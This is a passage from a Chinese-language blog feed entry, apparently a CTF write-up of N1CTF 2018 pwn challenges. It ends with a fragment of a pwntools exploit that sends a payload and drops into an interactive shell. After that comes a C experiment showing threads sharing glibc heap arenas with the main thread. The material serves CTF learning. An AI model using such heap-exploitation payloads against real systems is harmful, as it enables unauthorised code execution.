class="line">p.recvuntil(&apos;Input:&apos;)</span><br><span class="line">p.send(&apos;sh\0&apos;+p64(0)+p64(0x400978)+p64(0)*(0x60/8))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>​# 其他1. 打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。2.  想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a ;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%d] malloc address %p\n"</span>,num++,a);</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">void</span> * ret;</span><br><span class="line"><span class="keyword">char</span> *a;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is a test for thread arena! %d\n"</span>,num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">pthread_create(&amp;tid[i],<span class="literal">NULL</span>,thread_func,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] main malloc address %p\n"</span>,a);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line"><span class="comment">//pthread_create(&amp;tid[i],NULL,thread_func,NULL);</span></span><br><span class="line">pthread_join(tid[i],<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/n1ctf2018/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道，并主要针对线程堆的分配流程和结构分析了一波，读了两天源码...
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
</feed>
